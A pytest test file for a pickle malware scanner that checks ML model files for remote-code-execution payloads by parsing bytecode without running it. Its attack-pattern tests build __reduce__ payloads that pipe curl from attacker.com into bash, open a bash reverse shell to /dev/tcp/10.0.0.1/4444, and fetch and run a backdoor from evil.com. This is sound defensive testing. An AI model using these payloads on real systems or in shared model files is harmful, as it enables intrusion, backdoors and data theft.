"""Tests for pickle malware scanner.

All test payloads use REAL attack techniques documented in:
- Trail of Bits Fickling (2021): pickle __reduce__ RCE
- HuggingFace security blog (2023): malicious models in the Hub
- OWASP LLM05: Supply Chain Vulnerabilities

The scanner parses pickle bytecode via pickletools.genops() without
ever executing the payload — same approach as production scanners.
"""

import os
import pickle
import subprocess
import tempfile

import pytest

from src.scanners import scan_pickle_bytes, scan_pickle_file, PickleScanResult


class TestSafePickles:
    """Legitimate ML model pickles must not be flagged."""

    def test_plain_dict(self):
        """A model config dict — no code execution."""
        data = pickle.dumps({"learning_rate": 0.001, "epochs": 50, "layers": [128, 64, 10]})
        result = scan_pickle_bytes(data)
        assert result.risk_level == "safe"
        assert result.is_malicious is False

    def test_numpy_array(self):
        """numpy arrays are the most common pickle content in ML."""
        import numpy as np
        data = pickle.dumps(np.zeros((10, 768)))  # typical embedding shape
        result = scan_pickle_bytes(data)
        assert result.risk_level == "safe"

    def test_none(self):
        result = scan_pickle_bytes(pickle.dumps(None))
        assert result.risk_level == "safe"


class TestRealAttackPatterns:
    """Real attack patterns from documented supply chain incidents."""

    def test_os_system_rce(self):
        """Classic __reduce__ RCE — the exact pattern found in HuggingFace malicious uploads.

        On Windows, os.system resolves to nt.system in pickle bytecode.
        On Linux, it resolves to posix.system.
        Both are in our DANGEROUS_MODULES list.
        """
        class RCE:
            def __reduce__(self):
                return (os.system, ("curl http://attacker.com/exfil | bash",))

        data = pickle.dumps(RCE())
        result = scan_pickle_bytes(data)
        assert result.risk_level in ("suspicious", "malicious")
        assert len(result.findings) >= 2  # dangerous import + REDUCE execution

    def test_subprocess_popen_reverse_shell(self):
        """subprocess.Popen reverse shell — real technique from CTF and incident reports."""
        class ReverseShell:
            def __reduce__(self):
                return (subprocess.Popen, (["bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"],))

        data = pickle.dumps(ReverseShell())
        result = scan_pickle_bytes(data)
        assert result.risk_level == "malicious"
        assert any("subprocess" in imp for imp in result.dangerous_imports)

    def test_eval_import_chain(self):
        """eval(__import__('os').system('cmd')) — obfuscated RCE via builtins."""
        class EvalChain:
            def __reduce__(self):
                return (eval, ("__import__('os').system('id')",))

        data = pickle.dumps(EvalChain())
        result = scan_pickle_bytes(data)
        assert result.risk_level in ("suspicious", "malicious")
        assert len(result.dangerous_imports) > 0

    def test_multiple_payloads_in_sequence(self):
        """Attacker chaining multiple operations."""
        class MultiStage:
            def __reduce__(self):
                return (os.system, ("wget http://evil.com/backdoor && chmod +x backdoor && ./backdoor",))

        data = pickle.dumps(MultiStage())
        result = scan_pickle_bytes(data)
        assert result.risk_level in ("suspicious", "malicious")


class TestFileScanning:
    """Scan actual files on disk."""

    def test_scan_safe_file(self, tmp_path):
        filepath = tmp_path / "model.pkl"
        filepath.write_bytes(pickle.dumps({"w": [0.1, 0.2, 0.3], "b": 0.0}))
        result = scan_pickle_file(str(filepath))
        assert result.risk_level == "safe"

    def test_scan_malicious_file(self, tmp_path):
        class Payload:
            def __reduce__(self):
                return (os.system, ("id",))

        filepath = tmp_path / "evil.pkl"
        filepath.write_bytes(pickle.dumps(Payload()))
        result = scan_pickle_file(str(filepath))
        assert result.risk_level in ("suspicious", "malicious")

    def test_nonexistent_file_raises(self):
        with pytest.raises(FileNotFoundError):
            scan_pickle_file("/nonexistent/path/model.pkl")


class TestMalformedInput:
    """Scanner must handle garbage input gracefully."""

    def test_invalid_bytes(self):
        result = scan_pickle_bytes(b"\xff\xfe not pickle data")
        assert result.risk_level == "error"
        assert "Failed to parse" in result.findings[0]

    def test_truncated_pickle(self):
        data = pickle.dumps({"x": list(range(100))})
        result = scan_pickle_bytes(data[:8])
        assert result.risk_level in ("safe", "error")
